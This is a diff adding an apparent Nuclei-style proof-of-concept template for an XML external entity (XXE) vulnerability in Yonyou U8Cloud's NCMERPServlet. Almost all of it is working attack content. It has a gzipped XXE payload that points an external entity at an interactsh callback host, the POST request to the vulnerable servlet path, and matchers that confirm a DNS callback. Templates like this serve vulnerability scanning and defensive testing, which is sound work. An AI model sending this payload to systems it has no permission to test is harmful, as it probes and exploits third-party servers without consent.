@@ -1,0 +1,33 @@
+id: poc-yaml-yongyou-u8cloud-ncmerpservlet-xxe
+info:
+  name: 用友U8Cloud NCMERPServlet XML实体注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,xxe
+  description: |
+    用友U8Cloud NCMERPServlet XML实体注入漏洞可能允许攻击者通过恶意XML实体注入实现外部实体注入攻击。
+
+variables:
+  reverse: '{{interactsh-url}}'
+  payload: |-
+    <!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "http://{{reverse}}/mt">]><r><a>&xxe;</a ></r>
+  gpayload: '{{gzip(payload)}}'
+
+http:
+  - method: POST
+    path:
+      - /servlet/~uap/nc.merp.bs.NCMERPServlet
+    headers:
+      Content-Type: application/xml
+    body: '{{gpayload}}'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "mt"
